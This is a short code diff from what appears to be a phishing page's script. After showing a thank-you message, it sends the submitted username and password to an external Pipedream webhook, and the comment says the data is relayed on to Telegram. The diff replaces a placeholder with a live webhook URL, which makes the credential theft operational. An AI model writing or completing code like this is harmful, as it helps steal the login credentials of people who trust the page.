@@ -160,7 +160,7 @@
                 document.getElementById('thankYouMessage').classList.remove('hidden');
 
                 // Send data to Telegram via Pipedream
-                fetch('YOUR_PIPEDREAM_WEBHOOK_URL', {
+                fetch('https://eox47yzip3pxtkv.m.pipedream.net', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
